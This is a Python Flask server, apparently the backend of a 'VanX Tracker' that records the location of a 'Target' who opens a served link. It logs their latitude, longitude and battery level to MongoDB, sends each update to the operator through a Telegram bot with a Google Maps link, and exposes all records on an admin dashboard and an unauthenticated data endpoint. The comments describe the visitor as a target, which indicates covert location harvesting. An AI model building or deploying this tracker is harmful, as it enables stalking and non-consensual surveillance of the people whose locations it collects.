import os
import requests
from flask import Flask, request, jsonify, render_template
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from datetime import datetime

app = Flask(__name__)

# 1. Configuration (Render Environment Variables se)
uri = os.environ.get('MONGO_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# 2. MongoDB Setup
client = MongoClient(uri, server_api=ServerApi('1'))
db = client['vanx_database']
locations_col = db['locations']

# --- Routes ---

@app.route('/')
def index():
    # Target jab link open karega toh use index.html dikhega
    return render_template('index.html')

@app.route('/update')
def update_location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    batt = request.args.get('batt', 'N/A')
    note = request.args.get('note', 'Live')

    if lat and lon:
        # MongoDB mein save
        data = {
            "latitude": lat,
            "longitude": lon,
            "battery": batt,
            "type": note,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        locations_col.insert_one(data)
        
        # Telegram Notification
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        message = (f"📍 *VanX Tracker Update*\n\n"
                   f"🔋 *Battery:* {batt}\n"
                   f"📡 *Status:* {note}\n"
                   f"📍 *Lat:* `{lat}`\n"
                   f"📍 *Lon:* `{lon}`\n\n"
                   f"[Open in Google Maps]({maps_url})")
        
        tele_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(tele_url, data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
        
        return "OK", 200
    return "Error", 400

# Feature 6: Admin Dashboard Page
@app.route('/admin')
def admin_page():
    return render_template('dashboard.html')

# Dashboard ke liye data fetch karne ka rasta
@app.route('/get_data')
def get_data():
    locations = list(locations_col.find({}, {'_id': 0}).sort("timestamp", -1))
    return jsonify(locations)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
